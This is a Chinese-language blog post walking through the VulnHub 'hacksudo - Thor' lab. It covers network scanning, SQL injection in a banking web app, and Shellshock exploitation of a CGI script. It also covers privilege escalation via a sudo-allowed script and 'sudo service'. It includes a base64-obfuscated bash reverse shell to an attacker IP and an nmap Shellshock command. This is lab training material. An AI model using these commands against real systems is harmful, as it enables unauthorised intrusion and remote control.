<!DOCTYPE html>
<html lang="zh-CN">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="Xi4nb3i" />
  <meta name="description" content="" />
  
  
  <title>
    
      【vlunhub】hacksudo - Thor 
      
      
    
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.svg">
    <link rel="icon" href="/images/favicon.svg">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Montserrat|Roboto:400,400italic,600|Roboto+Mono" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="/css/common.css">
<link rel="stylesheet" href="/iconfont/iconfont.css">


  

  
    
<link rel="stylesheet" href="/css/post.css">

  

  <!-- jquery3.3.1 -->
  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

  <!-- fancybox -->
  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
  
<script src="/js/fancybox.js"></script>


<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Xi4nb3i's blog" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <a href="/">Xi4nb3i</a>
</div>


      <p class="links">
  
    <a title="archives" target="" href="/archives/">
      <i class="iconfont icon-bookmark"></i>
    </a>
  
    <a title="github" target="_blank" href="https://github.com/xianbeil">
      <i class="iconfont icon-github"></i>
    </a>
  
    <a title="twitter" target="_blank" href="https://twitter.com/aeqaq0">
      <i class="iconfont icon-twitter"></i>
    </a>
  
</p>


      <div class="main">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->

<!-- LaTex Display -->
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
</script>
<script>
  MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']]
    }
  };
</script>

<div class="post">
  <h3 class="date">
    Aug 29, 2022
  </h3>
  <h1>
    【vlunhub】hacksudo - Thor
  </h1>
  <div class="content markdown-body">
    <blockquote>
<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacksudo-thor,733/">https://www.vulnhub.com/entry/hacksudo-thor,733/</a></p>
<p>个人测评：</p>
<p>趣味：3星</p>
<p>难度：3星</p>
<p>技巧：2星</p>
</blockquote>
<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>bash遍历扫c段</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> $( <span class="built_in">seq</span> 1 255);<span class="keyword">do</span> ping -c 1 10.0.2.<span class="variable">$k</span>|grep <span class="string">&quot;ttl&quot;</span>|awk -F <span class="string">&quot;[ :]+&quot;</span> <span class="string">&#x27;&#123;print $4&#125;&#x27;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>找到我们的目标靶机</p>
<p>或者用arp二层发现</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829192952-0oc8eg0.png" alt="image"></p>
<p>用nmap进行全端口扫描</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829193043-7nblkuv.png" alt="image"></p>
<p>80端口是个网站，先尝试从这里突破</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829193158-9p27ts9.png" alt="image"></p>
<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>扫出来一个readme，里面泄露了源码地址</p>
<p><a target="_blank" rel="noopener" href="https://github.com/zakee94/online-banking-system">https://github.com/zakee94/online-banking-system</a></p>
<p>到管理员登陆后台，用sql文件里面自带的admin登陆即可</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829195708-2eyi11x.png" alt="image"></p>
<p>发现一个无过滤的注入点</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829195943-lhdoqhv.png" alt="image"></p>
<p>同样的，后台有回显的注入</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829201858-njf1lu2.png" alt="image"><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829201906-tj7q4yl.png" alt="image"></p>
<p>先用load_file找到网站路径</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829202020-lr4k9lu.png" alt="image"></p>
<p>貌似没有写入权限</p>
<p>那如何getshell呢，这里直接卡住</p>
<h1 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u url -f -e cgi,sh</span><br><span class="line">看有没有cgi，sh结尾的文件</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829211016-v8r630y.png" alt="image"></p>
<p>存在破壳漏洞</p>
<p>关于破壳漏洞：<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html">https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html</a></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829211212-gb04dfv.png" alt="image"></p>
<p>反弹shell</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829211934-pjgs1gg.png" alt="image"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>suid，sudo， 系统版本检查</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829213112-v5ykx2w.png" alt="image"></p>
<p>www-data可以不用密码就能调用hammer.sh这个脚本</p>
<p>发现能执行命令</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829214053-qwbz32q.png" alt="image"></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829214125-lf8sqfd.png" alt="image"></p>
<p>尝试反弹shell，获取thor的权限</p>
<p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMi80NDQ1IDA+JjE&#x3D;}|{base64,-d}|{bash,-i}</p>
<p>硬弹成功</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829214626-eeecw1a.png" alt="image"></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829214636-9cch9od.png" alt="image"></p>
<p>sudo权限</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829214745-9eksbpe.png" alt="image"></p>
<p>一手service sudo提权，谢幕</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829215035-ou1c0r6.png" alt="image"></p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829215125-n0pthmt.png" alt="image"></p>
<p>这画的是啥。。。</p>
<p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220829215226-eewii68.png" alt="image"></p>
<p>是个锤子</p>
<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>nmap扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p80 --script http-shellshock uri=/cgi-bin/shell.sh,cmd=<span class="built_in">ls</span> ip</span><br></pre></td></tr></table></figure>

  </div>
  
    
      <a id="older" class="blog-nav" href="/2022/08/28/20220829%E5%86%99%E7%BB%99%E8%87%AA%E5%B7%B1v3/">OLDER&nbsp;&gt;</a>
      
        
          <a id="newer" class="blog-nav" href="/2022/08/30/20220830vulnhub-BILLU/">&lt;&nbsp;NEWER</a>
          
            
</div>
        <div class="footer">
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Copyright © Leedom 2021</a>
        
    </div>
  
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/leedom92/hexo-theme-leedom">Theme by Leedom | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="back-to-top hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



      


    </div>
  </body>
</html>
